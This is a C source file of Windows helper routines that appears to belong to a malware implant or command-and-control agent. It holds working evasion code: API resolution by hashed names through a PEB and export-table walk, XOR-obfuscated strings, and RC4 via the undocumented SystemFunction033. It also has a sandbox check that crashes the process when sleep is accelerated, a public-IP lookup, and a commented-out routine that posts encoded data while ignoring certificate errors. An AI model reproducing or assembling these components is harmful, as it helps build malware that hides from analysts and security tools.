#include "pch.h"

UINT32 HashStringRotr32SubA
(
	_In_ UINT32 uValue,
	_In_ UINT   uCount
)
{
	DWORD Mask = (CHAR_BIT * sizeof(uValue) - 1);
	uCount &= Mask;
#pragma warning( push )
#pragma warning( disable : 4146)
	return (uValue >> uCount) | (uValue << ((-uCount) & Mask));
#pragma warning( pop ) 
}

DWORD HashStringRotr32A
(
	_In_ LPSTR s
)
{
	DWORD Value = 0;

	for (INT Index = 0; Index < strlen(s); Index++)
		Value = s[Index] + HashStringRotr32SubA(Value, SEED);

	return Value;
}

HMODULE GetModuleHandleByHash
(
	_In_ LPSTR ModuleName
)
{
	if (ModuleName == NULL)
		return NULL;

	PPEB pPeb = (PPEB)__readgsqword(0x60);
	PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
	PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

	while (pDte) {
		if (pDte->FullDllName.Buffer != NULL) {
			if (pDte->FullDllName.Length < MAX_PATH - 1) {
				CHAR DllName[MAX_PATH] = { 0 };
				DWORD i = 0;
				while (pDte->FullDllName.Buffer[i] && i < sizeof(DllName) - 1) {
					DllName[i] = (char)pDte->FullDllName.Buffer[i];
					i++;
				}

				DllName[i] = '\0';
				if (HASHA(DllName) == HASHA(ModuleName)) {
					return (HMODULE)(pDte->InInitializationOrderLinks.Flink);
				}
			}
		}
		else {
			break;
		}

		pDte = (PLDR_DATA_TABLE_ENTRY)DEREF_64(pDte);
	}
	return NULL;
}

UINT32 CopyDotStr
(
	_In_ PCHAR String
)
{
	for (UINT32 i = 0; i < strlen(String); i++)
	{
		if (String[i] == '.')
			return i;
	}

	return 0;
}

LPCWSTR DecryptStringW
(
	_In_ PBYTE pBuffer
)
{
	SHORT c;
	INT i = 0;

	while (TRUE) {
		c = *(PSHORT)&pBuffer[i];
		c ^= 0xD1A5;
		if (c == 0) {
			break;
		}

		*(PSHORT)&pBuffer[i] = c;
		i += sizeof(WCHAR);
	}

	return (LPCWSTR)pBuffer;
}

LPVOID GetProcAddressByHash
(
	_In_ HMODULE hModule,
	_In_ DWORD   dwHash
)
{
	if (hModule == NULL || dwHash == 0)
		return NULL;

	HMODULE hModule2 = NULL;
	UINT64	DllBaseAddress = (UINT64)hModule;

	PIMAGE_NT_HEADERS NtHdr = (PIMAGE_NT_HEADERS)(DllBaseAddress + ((PIMAGE_DOS_HEADER)DllBaseAddress)->e_lfanew);
	PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)&NtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	PIMAGE_EXPORT_DIRECTORY ExportTable = (PIMAGE_EXPORT_DIRECTORY)(DllBaseAddress + pDataDir->VirtualAddress);

	UINT64 FunctionNameAddressArray = (DllBaseAddress + ExportTable->AddressOfNames);
	UINT64 FunctionAddressArray = (DllBaseAddress + ExportTable->AddressOfFunctions);
	UINT64 FunctionOrdinalAddressArray = (DllBaseAddress + ExportTable->AddressOfNameOrdinals);
	UINT64 pFunctionAddress = 0;
	// UINT64 wSignature = 0;

	DWORD	dwCounter = ExportTable->NumberOfNames;

	while (dwCounter--) {
		char* FunctionName = (char*)(DllBaseAddress + DEREF_32(FunctionNameAddressArray));

		if (HASHA(FunctionName) == dwHash) {
			FunctionAddressArray += (DEREF_16(FunctionOrdinalAddressArray) * sizeof(DWORD));
			pFunctionAddress = (UINT64)(DllBaseAddress + DEREF_32(FunctionAddressArray));

			if (pDataDir->VirtualAddress <= DEREF_32(FunctionAddressArray) && (pDataDir->VirtualAddress + pDataDir->Size) >= DEREF_32(FunctionAddressArray)) {
				CHAR Library[MAX_PATH] = { 0 };
				CHAR Function[MAX_PATH] = { 0 };
				UINT32 Index = CopyDotStr((PCHAR)pFunctionAddress);
				if (Index == 0) {
					return NULL;
				}

				memcpy((PVOID)Library, (PVOID)pFunctionAddress, Index);
				memcpy((PVOID)Function, (PVOID)((ULONG_PTR)pFunctionAddress + Index + 1), strlen((LPCSTR)((ULONG_PTR)pFunctionAddress + Index + 1)));
				if ((hModule2 = LoadLibraryA(Library)) != NULL) {
					pFunctionAddress = (UINT64)GetProcAddressByHash(hModule2, HASHA(Function));
				}
			}
			break;
		}

		FunctionNameAddressArray += sizeof(DWORD);
		FunctionOrdinalAddressArray += sizeof(WORD);
	}

	return (LPVOID)(pFunctionAddress);
}

UINT64 ReadQword
(
	_In_ LPVOID lpAddr
)
{
	BYTE Buffer[sizeof(UINT64)];
	UINT64 uResult = 0;
	DWORD i;
	UINT64 dwTemp;

	if (memcpy(Buffer, lpAddr, sizeof(Buffer))) {
		for (i = 0; i < _countof(Buffer); i++) {
			dwTemp = Buffer[i];
			uResult += (dwTemp << (i * 8));
		}
	}

	return uResult;
}

LPSTR* ReadEachLineA
(
	_In_  LPSTR  lpBuffer,
	_Out_ PDWORD pdwCount
)
{
	DWORD dwIdx = 0;
	DWORD dwIdxStart = 0;
	DWORD dwLength;
	CHAR szTemp[0x100];
	LPSTR* lpResult;
	DWORD dwCount = 0;

	lpResult = (LPSTR*)ALLOC(sizeof(LPSTR));

	while (lpBuffer[dwIdx] != '\0') {
		if (lpBuffer[dwIdx] == '\n') {
			dwLength = dwIdx - dwIdxStart;
			lpResult[dwCount] = (LPSTR)ALLOC(dwLength + 1);
			memcpy(lpResult[dwCount], &lpBuffer[dwIdxStart], dwLength);
			dwCount += 1;
			lpResult = (LPSTR*)REALLOC(lpResult, (dwCount + 1) * sizeof(LPSTR));
			dwIdxStart = dwIdx + 1;
		}

		dwIdx++;
	}

	*pdwCount = dwCount;
	return lpResult;
}

LPSTR ReplaceSubstring
(
	_In_ LPSTR lpBuffer,
	_In_ LPSTR lpOldPattern,
	_In_ LPSTR lpNewPattern
)
{
	LPSTR lpStart = strstr(lpBuffer, lpOldPattern);
	LPSTR lpResult = NULL;
	DWORD dwNewSize;
	DWORD dwIdx;

	if (lpStart && strlen(lpOldPattern) > 0) {
		dwNewSize = strlen(lpBuffer) - strlen(lpOldPattern) + strlen(lpNewPattern);
		lpResult = ALLOC((SIZE_T)dwNewSize + 1);
		dwIdx = lpStart - lpBuffer;

		if (lpResult == NULL) {
			return NULL;
		}

		memcpy(lpResult, lpBuffer, dwIdx);
		memcpy(&lpResult[dwIdx], lpNewPattern, strlen(lpNewPattern));
		strcat_s(lpResult, (SIZE_T)dwNewSize + 1, &lpStart[strlen(lpOldPattern)]);

		return lpResult;
	}

	return NULL;
}

DWORD StrHash
(
	_In_ LPSTR s
)
{
	DWORD dwHashVal = 0;
	DWORD dwTemp = 0;

	for (DWORD i = 0; i < strlen(s); i++) {
		dwHashVal = (dwHashVal << 4) + s[i];
		dwTemp = dwHashVal & 0xF0000000L;
		if (dwTemp != 0)
			dwHashVal ^= dwTemp >> 24;

		dwHashVal &= ~dwTemp;
	}

	return dwHashVal;
}

LPSTR GetPublicIp
(
	_In_ HINTERNET hInternet
)
{
	HANDLE hConnect = NULL;
	HANDLE hRequest = NULL;
	LPSTR lpResp = NULL;
	DWORD dwRespSize = 0;

	hConnect = InternetConnectA(hInternet, "ifconfig.me", 80, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
	hRequest = HttpOpenRequestA(hConnect, "GET", "/ip", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);

	lpResp = SendRequestGetResponse(hRequest, &dwRespSize);

	if (hRequest) {
		InternetCloseHandle(hInternet);
	}

	if (hConnect) {
		InternetCloseHandle(hConnect);
	}

	return lpResp;
}

LPSTR Encode
(
	_In_ LPSTR lpKey,
	_In_ LPSTR lpPlainText
)
{
	LPSTR lpCipher = NULL;
	CHAR c;
	DWORD dwPlaceholder;

	lpCipher = ALLOC(strlen(lpPlainText) + 1);
	for (DWORD i = 0; i < strlen(lpPlainText); i++) {
		c = lpKey[i % strlen(lpKey)];
		dwPlaceholder = (DWORD)(lpPlainText[i]) + (DWORD)(c);
		lpCipher[i] = (UCHAR)(dwPlaceholder % 127);
	}

	return lpCipher;
}

//LPSTR SendEncodedString
//(
//	_In_  PSTRINGS pStrings,
//	_In_  LPSTR    lpKey,
//	_In_  LPSTR    lpData,
//	_In_  LPSTR    lpEndpoint,
//	_In_  HANDLE   hConnect
//)
//{
//	LPSTR lpResult = NULL;
//	LPSTR lpBuffer = NULL;
//	LPSTR lpChunk = NULL;
//	HANDLE hRequest;
//	BOOL bReqSuccess;
//	DWORD dwReceivedData = 0;
//	DWORD dwChunkSize = 2048;
//	DWORD dwSize = 0;
//
//	lpResult = Encode(lpKey, lpData);
//	hRequest = HttpOpenRequestA(hConnect, pStrings->lpPost, lpEndpoint, NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
//	bReqSuccess = HttpSendRequestA(hRequest, NULL, NULL, (LPVOID)lpResult, strlen(lpResult));
//	lpResult = NULL;
//
//	if (bReqSuccess) {
//		lpChunk = ALLOC(dwChunkSize);
//		lpBuffer = ALLOC(dwChunkSize);
//		while (InternetReadFile(hRequest, lpChunk, dwChunkSize, &dwReceivedData) && dwReceivedData)
//		{
//			lpBuffer = REALLOC(lpBuffer, dwSize + dwReceivedData);
//			memcpy(&lpBuffer[dwSize], lpChunk, dwReceivedData);
//			dwSize += dwReceivedData;
//		}
//
//		HttpEndRequestA(hRequest, NULL, NULL, NULL);
//		InternetCloseHandle(hRequest);
//		lpResult = Decode(lpKey, lpBuffer);
//	}
//
//	if (lpChunk != NULL) {
//		FREE(lpChunk);
//	}
//
//	if (lpBuffer != NULL) {
//		FREE(lpChunk);
//	}
//
//	HttpEndRequestA(hRequest, NULL, NULL, NULL);
//	InternetCloseHandle(hRequest);
//	return lpResult;
//}

BOOL DirectoryExists
(
	_In_ LPSTR szPath
)
{
	DWORD dwAttrib = GetFileAttributesA(szPath);

	return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
		(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

BOOL IsFileExists
(
	_In_ LPWSTR wszPath
)
{
	DWORD dwAttrib = GetFileAttributesW(wszPath);
	return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

BOOL IsPathExists
(
	_In_ LPSTR lpPath
)
{
	DWORD dwAttrib = GetFileAttributesA(lpPath);
	return (dwAttrib != INVALID_FILE_ATTRIBUTES);
}

VOID Decrypt
(
	_In_ PBYTE pBuffer,
	_In_ DWORD dwSize,
	_In_ LPSTR lpKey
)
{
	/*UCHAR c;
	DWORD i;

	for (i = 0; i < dwSize; i++) {
		pBuffer[i] ^= lpKey[i % strlen(lpKey)];
	}*/
	return;
}

LPSTR ConvertToChar
(
	_In_  LPWSTR wszInput
)
{
	DWORD dwSize = 0;
	LPSTR lpResult = NULL;

	dwSize = WideCharToMultiByte(CP_UTF8, 0, wszInput, wcslen(wszInput), NULL, 0, NULL, NULL);
	lpResult = ALLOC(dwSize + 1);
	dwSize = WideCharToMultiByte(CP_UTF8, 0, wszInput, wcslen(wszInput), lpResult, dwSize, NULL, NULL);

	return lpResult;
}

LPWSTR ConvertToWChar
(
	_In_ LPSTR szInput
)
{
	DWORD dwSize = 0;
	LPWSTR lpResult = NULL;

	dwSize = MultiByteToWideChar(CP_UTF8, 0, szInput, strlen(szInput), NULL, 0);
	lpResult = ALLOC((dwSize + 1) * sizeof(WCHAR));
	dwSize = MultiByteToWideChar(CP_UTF8, 0, szInput, strlen(szInput), lpResult, dwSize);
	return lpResult;
}

VOID CustomSleep
(
	_In_ DWORD dwMilliseconds
)
{
	FILETIME Start, End;
	UINT64 uStart, uEnd;
	uStart = uEnd = 0;
	FLOAT Exception;

	GetSystemTimeAsFileTime(&Start);
	//uStart = ((UINT64)(Start.dwHighDateTime) << 32) | Start.dwLowDateTime;
	uStart = *(PUINT64)(&Start);
	Sleep(dwMilliseconds);
	GetSystemTimeAsFileTime(&End);
	uEnd = *(PUINT64)(&End);

	if (uEnd - uStart < 100000000) {
		Exception = (DOUBLE)1 / (uEnd - uEnd);
	}
}

BOOL Base64Encode
(
	_In_  PBYTE  pData,
	_In_  DWORD  dwSize,
	_Out_ LPSTR * pDigest
)
{
	DWORD dwDigestSize = 0;
	LPSTR lpOutput = NULL;
	DWORD i = 0;

	if (!CryptBinaryToStringA(pData, dwSize, CRYPT_STRING_BASE64, NULL, &dwDigestSize)) {
		return FALSE;
	}

	lpOutput = ALLOC(dwDigestSize);
	if (!CryptBinaryToStringA(pData, dwSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, lpOutput, &dwDigestSize)) {
		if (lpOutput != NULL) {
			FREE(lpOutput);
		}

		return FALSE;
	}

	*pDigest = lpOutput;
	return TRUE;
}

BOOL Base64Decode
(
	_In_  LPSTR  lpDigest,
	_Out_ PBYTE * pSrc,
	_Out_ PDWORD pdwSize
)
{
	PBYTE pOutput = NULL;
	DWORD dwOutputSize = 0;
	DWORD dwDigestSize = strlen(lpDigest);

	if (!CryptStringToBinaryA(lpDigest, dwDigestSize, CRYPT_STRING_BASE64, NULL, &dwOutputSize, NULL, NULL)) {
		return FALSE;
	}

	pOutput = ALLOC(dwOutputSize);
	if (!CryptStringToBinaryA(lpDigest, dwDigestSize, CRYPT_STRING_BASE64, pOutput, &dwOutputSize, NULL, NULL)) {
		if (pOutput != NULL) {
			FREE(pOutput);
		}
		return FALSE;
	}

	*pSrc = pOutput;
	*pdwSize = dwOutputSize;
	return TRUE;
}

PBYTE XorString
(
	_In_ LPSTR lpStr,
	_In_ DWORD dwSize,
	_In_ DWORD dwKey
)
{
	DWORD i = 0;
	DWORD j = 0;
	UINT8 c;
	PBYTE pResult = NULL;

	pResult = ALLOC(dwSize + 1);

	for (i = 0; i < dwSize; i++) {
		c = lpStr[i];
		for (j = 0; j < 32; j += 8) {
			c = c ^ ((dwKey >> j) & 0xFF);
		}

		dwKey += 1;
		pResult[i] = c;
	}

	return pResult;
}

BOOL GenRandomBytes
(
	_Inout_ PBYTE pBuffer,
	_In_	DWORD dwSize
)
{
	BCRYPT_ALG_HANDLE AlgHandle = NULL;
	NTSTATUS status = 0;
	BOOL bResult = FALSE;

	status = BCryptOpenAlgorithmProvider(&AlgHandle, BCRYPT_RNG_ALGORITHM, NULL, 0);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	status = BCryptGenRandom(AlgHandle, pBuffer, dwSize, 0);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	bResult = TRUE;
CLEANUP:
	if (AlgHandle != NULL) {
		BCryptCloseAlgorithmProvider(AlgHandle, 0);
	}

	return bResult;
}

BOOL EncryptData
(
	_In_  PBYTE  pPlaintext,
	_In_  DWORD  dwPlainSize,
	_Out_ PBYTE * pCipher,
	_Out_ PDWORD pdwCipherSize,
	_In_  PBYTE  pKey
)
{
	BCRYPT_ALG_HANDLE AlgHandle = NULL;
	NTSTATUS status = 0;
	BOOL bResult = FALSE;
	ULONG uNumberOfBytesRead = 0;
	PBYTE pIv = NULL;
	PBYTE pKeyObj = NULL;
	DWORD dwKeyObjSize = 0;
	DWORD dwBlockLength = 0;
	BCRYPT_KEY_HANDLE hKey = NULL;
	PBYTE pCipherText = NULL;
	DWORD dwCipherText = 0;
	PBYTE pResult = NULL;
	DWORD dwResultSize = 0;
	PBYTE pTempIv = NULL;

	pIv = ALLOC(16);
	pTempIv = ALLOC(16);
	if (!GenRandomBytes(pIv, 16)) {
		goto CLEANUP;
	}

	memcpy(pTempIv, pIv, 16);
	status = BCryptOpenAlgorithmProvider(&AlgHandle, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	status = BCryptGetProperty(AlgHandle, BCRYPT_OBJECT_LENGTH, &dwKeyObjSize, sizeof(DWORD), &uNumberOfBytesRead, 0);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	pKeyObj = ALLOC(dwKeyObjSize);
	status = BCryptGetProperty(AlgHandle, BCRYPT_BLOCK_LENGTH, &dwBlockLength, sizeof(DWORD), &uNumberOfBytesRead, 0);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	if (dwBlockLength > 16) {
		goto CLEANUP;
	}

	status = BCryptSetProperty(AlgHandle, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	status = BCryptGenerateSymmetricKey(AlgHandle, &hKey, pKeyObj, dwKeyObjSize, pKey, 16, 0);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	status = BCryptEncrypt(hKey, pPlaintext, dwPlainSize, NULL, pIv, dwBlockLength, NULL, 0, &dwCipherText, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	pCipherText = ALLOC(dwCipherText);
	status = BCryptEncrypt(hKey, pPlaintext, dwPlainSize, NULL, pIv, dwBlockLength, pCipherText, dwCipherText, &dwCipherText, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	dwResultSize = dwBlockLength + dwCipherText;
	pResult = ALLOC(dwResultSize);
	memcpy(pResult, pTempIv, dwBlockLength);
	memcpy(&pResult[dwBlockLength], pCipherText, dwCipherText);

	*pCipher = pResult;
	*pdwCipherSize = dwResultSize;
	bResult = TRUE;
CLEANUP:
	if (AlgHandle != NULL) {
		BCryptCloseAlgorithmProvider(AlgHandle, 0);
	}

	if (hKey != NULL) {
		BCryptDestroyKey(hKey);
	}

	if (pIv != NULL) {
		FREE(pIv);
	}

	if (pCipherText != NULL) {
		FREE(pCipherText);
	}

	if (pKeyObj != NULL) {
		FREE(pKeyObj);
	}

	return bResult;
}

BOOL DecryptData
(
	_In_  PBYTE  pInput,
	_In_  DWORD  dwInputSize,
	_Out_ PBYTE * pOutput,
	_Out_ PDWORD pdwOutputSize,
	_In_  PBYTE  pKey
)
{
	BCRYPT_ALG_HANDLE AlgHandle = NULL;
	NTSTATUS status = 0;
	BOOL bResult = FALSE;
	ULONG uNumberOfBytesRead = 0;
	PBYTE pIv = NULL;
	DWORD dwBlockLength = 0;
	BCRYPT_KEY_HANDLE hKey = NULL;
	PBYTE pCipherText = NULL;
	DWORD dwCipherTextSize = 0;
	PBYTE pPlainText = NULL;
	DWORD dwPlainTextSize = 0;

	status = BCryptOpenAlgorithmProvider(&AlgHandle, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	status = BCryptGetProperty(AlgHandle, BCRYPT_BLOCK_LENGTH, &dwBlockLength, sizeof(DWORD), &uNumberOfBytesRead, 0);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	if (dwBlockLength > 16) {
		goto CLEANUP;
	}

	pIv = ALLOC(dwBlockLength);
	memcpy(pIv, pInput, dwBlockLength);
	dwCipherTextSize = dwInputSize - dwBlockLength;
	pCipherText = ALLOC(dwCipherTextSize);
	memcpy(pCipherText, &pInput[dwBlockLength], dwCipherTextSize);

	status = BCryptSetProperty(AlgHandle, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	status = BCryptGenerateSymmetricKey(AlgHandle, &hKey, NULL, 0, pKey, 16, 0);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	status = BCryptDecrypt(hKey, pCipherText, dwCipherTextSize, NULL, pIv, dwBlockLength, NULL, 0, &dwPlainTextSize, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	pPlainText = ALLOC(dwPlainTextSize);
	memcpy(pIv, pInput, dwBlockLength);
	status = BCryptDecrypt(hKey, pCipherText, dwCipherTextSize, NULL, pIv, dwBlockLength, pPlainText, dwPlainTextSize, &dwPlainTextSize, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	*pOutput = pPlainText;
	*pdwOutputSize = dwPlainTextSize;
	bResult = TRUE;
CLEANUP:
	if (AlgHandle != NULL) {
		BCryptCloseAlgorithmProvider(AlgHandle, 0);
	}

	if (hKey != NULL) {
		BCryptDestroyKey(hKey);
	}

	if (pIv != NULL) {
		FREE(pIv);
	}

	if (pCipherText != NULL) {
		FREE(pCipherText);
	}

	return bResult;
}

DWORD Pow
(
	_In_ DWORD dwX,
	_In_ DWORD dwY
)
{
	DWORD i;
	DWORD dwResult = 1;

	for (i = 0; i < dwY; i++) {
		dwResult *= dwX;
	}

	return dwResult;
}

VOID Rc4EncryptDecrypt
(
	_In_  PBYTE  pbBuffer,
	_In_  DWORD  dwSize,
	_In_  PBYTE  pbKey,
	_In_  DWORD  dwKeySize
)
{
	struct ustring {
		DWORD Length;
		DWORD MaximumLength;
		PVOID Buffer;
	};

	struct ustring Key = { 0 };
	struct ustring PlainText = { 0 };
	NTSTATUS Status = 0;

	typedef NTSTATUS(WINAPI* _SystemFunction033)(struct ustring* memoryRegion, struct ustring* keyPointer);
	// fwprintf_s(f_log, L"Rc4EncryptDecrypt\n");
	_SystemFunction033 SystemFunction033 = GetProcAddress(LoadLibraryW(L"advapi32.dll"), "SystemFunction033");
	ZeroMemory(&Key, sizeof(struct ustring));
	ZeroMemory(&PlainText, sizeof(struct ustring));
	PlainText.Buffer = (PVOID)pbBuffer;
	PlainText.Length = dwSize;

	Key.Buffer = (PVOID)pbKey;
	Key.Length = dwKeySize;

	Status = SystemFunction033(&PlainText, &Key);
}

BOOL StartWith
(
	_In_ LPSTR lpSrc,
	_In_ LPSTR lpPattern
)
{
	CHAR c;
	DWORD dwCmpResult = 0;
	BOOL bResult = FALSE;

	if (strlen(lpSrc) < strlen(lpPattern)) {
		return FALSE;
	}

	c = lpSrc[strlen(lpPattern)];
	lpSrc[strlen(lpPattern)] = '\0';
	dwCmpResult = strcmp(lpSrc, lpPattern);
	if (dwCmpResult == 0) {
		bResult = TRUE;
	}

	lpSrc[strlen(lpPattern)] = c;
	return bResult;
}

BOOL EndWithA
(
	_In_ LPSTR lpSrc,
	_In_ LPSTR lpPattern
)
{
	DWORD dwCmpResult = 0;
	BOOL bResult = FALSE;

	if (strlen(lpSrc) < strlen(lpPattern)) {
		return FALSE;
	}

	dwCmpResult = strcmp(&lpSrc[strlen(lpSrc) - strlen(lpPattern)], lpPattern);
	if (dwCmpResult == 0) {
		bResult = TRUE;
	}

	return bResult;
}

BOOL EndWithW
(
	_In_ LPWSTR wszSrc,
	_In_ LPWSTR wszPattern
)
{
	DWORD dwCmpResult = 0;
	BOOL bResult = FALSE;

	if (wcslen(wszSrc) < wcslen(wszPattern)) {
		return FALSE;
	}

	dwCmpResult = wcscmp(&wszSrc[wcslen(wszSrc) - wcslen(wszPattern)], wszPattern);
	if (dwCmpResult == 0) {
		bResult = TRUE;
	}

	return bResult;
}

VOID CustomExit() {
	DWORD dwTemp = 10;
	DWORD dwResult = 0;

	dwResult = 1 / (dwTemp - 10);
}

BOOL IsUserAdmin()
{
	BOOL bIsAdmin = FALSE;
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	PSID AdministratorsGroup = NULL;

	bIsAdmin = AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup);
	if (bIsAdmin) {
		if (!CheckTokenMembership(NULL, AdministratorsGroup, &bIsAdmin)) {
			bIsAdmin = FALSE;
		}

		FreeSid(AdministratorsGroup);
	}

	return bIsAdmin;
}